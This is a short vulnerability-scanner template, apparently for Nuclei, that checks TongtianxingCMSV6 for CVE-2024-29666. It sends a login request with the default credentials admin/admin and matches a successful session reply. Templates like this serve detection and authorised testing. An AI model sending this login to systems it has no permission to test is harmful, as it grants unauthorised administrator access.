id: cve-2024-29666
info:
  name: TongtianxingCMSV6 Admin Weak Password (CVE-2024-29666)
  author: ProjectDiscoveryAI
  severity: high
  tags: cve-2024-29666,weak-password

http:
  - raw:
      - |
        GET /StandardApiAction_login.action?account=admin&password=admin HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"jsession"'
      - type: word
        words:
          - '"account_name":"admin"'
        part: body
      - type: word
        words:
          - "application/json"
        part: header
